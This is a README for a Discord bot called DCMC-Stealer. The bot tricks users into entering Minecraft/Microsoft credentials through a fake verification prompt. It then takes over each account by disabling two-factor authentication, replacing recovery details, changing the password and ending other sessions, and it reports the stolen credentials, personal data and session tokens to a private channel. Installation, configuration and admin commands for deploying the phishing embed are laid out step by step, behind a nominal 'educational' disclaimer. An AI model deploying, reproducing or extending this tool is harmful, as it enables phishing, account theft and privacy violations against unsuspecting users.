# DCMC-Stealer
[![Ask DeepWiki](https://devin.ai/assets/askdeepwiki.png)](https://deepwiki.com/LorenzHPP/DCMC-Stealer)

## ⚠️ Disclaimer
This project is intended for educational and security research purposes only. Using this tool on accounts without the explicit permission of the owner is illegal and unethical. The author assumes no responsibility for any misuse of this software.

## Overview
DCMC-Stealer is a sophisticated Discord bot designed to automate the process of taking over Microsoft accounts through a deceptive verification system. It prompts users to enter their Minecraft account credentials via a Discord modal. Upon submission, the bot initiates a series of automated actions to gain and secure control over the account, sending the compromised credentials and account details to a private Discord channel.

## Features
- **Multi-Factor Authentication Handling**: Simulates login flows to manage prompts from the Microsoft Authenticator app and one-time passcodes (OTP) sent to security emails.
- **Automated Account Takeover**: Once initial access is gained, the bot automatically:
    - Disables two-factor authentication (2FA).
    - Removes all existing security proofs (emails, phone numbers, etc.).
    - Adds a new, bot-controlled security email generated via `mail.tm`.
    - Generates a new account recovery code.
    - Changes the account password.
    - Logs out all other active sessions from the account.
    - Optionally replaces the primary email alias with a new one.
- **Detailed Information Extraction**: Gathers and reports comprehensive information from the compromised account, including:
    - Minecraft username, capes, and account purchase method (Game Pass vs. direct purchase).
    - Personal user information such as full name, region, and birthday.
    - Xbox Live details and the account's SSID (Minecraft services access token).
- **Discord Integration**: Fully integrated with Discord using slash commands for administration and modals/buttons for user interaction.
- **Hit Logging**: Sends detailed reports of successfully compromised accounts, including new credentials and extracted data, to a designated Discord channel.

## Installation

1.  **Clone the repository:**
    ```sh
    git clone https://github.com/lorenzhpp/dcmc-stealer.git
    cd dcmc-stealer
    ```

2.  **Install dependencies:**
    ```sh
    pip install -r requirements.txt
    ```

3.  **Configure the bot:**
    - Rename or copy `config.json.example` to `config.json`.
    - Edit `config.json` with your specific details (see Configuration section below).

4.  **Run the bot:**
    ```sh
    python bot.py
    ```

## Configuration

The `config.json` file is used to configure the bot's behavior.

```json
{
    "owners": [
        "Your_discord_id"
    ],
    "tokens": {
        "bot_token": "Your_token_here"
    },
    "discord": {
        "accounts_channel": ""
    },
    "autosecure": {
        "replace_main_alias": true
    }
}
```

-   `owners`: An array of your Discord User IDs. These users will have administrative privileges for the bot.
-   `bot_token`: Your Discord application's bot token.
-   `accounts_channel`: The ID of the Discord channel where successful "hits" (compromised account details) will be sent. You can set this using the `/set_channel` command.
-   `replace_main_alias`: If `true`, the bot will attempt to change the compromised account's primary email alias.

## Usage

### Bot Setup
1.  **Set the Hits Channel**: In the Discord channel where you want to receive account notifications, run the `/set_channel` command. This saves the channel ID to your configuration.
2.  **Deploy the Verification Embed**: In a public channel, use the `/send_embed` command to post the verification message. Users will interact with this message to start the process.

### Admin Commands

-   `/send_embed [type]` - Posts the verification embed. The `default` type uses a pre-written message, while `custom` allows you to define your own title and text.
-   `/set_channel [choice]` - Sets the channel for logging account hits.
-   `/check_locked [email]` - Checks if a specific Microsoft account email is locked.
-   `/auth_code [secret]` - Generates a TOTP code from a 2FA secret key. Includes a refresh button for new codes.
-   `/list_mails` - Lists all security emails that have been generated and stored by the bot.
-   `/inbox [email]` - Fetches and displays the contents of the inbox for a specified generated security email, useful for manual verification.
-   `/secure` - Initiates the manual account securing process using an MSAAUTH token.
-   `/reload [cog]` - Hot-reloads a bot extension (e.g., `jishaku`).

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
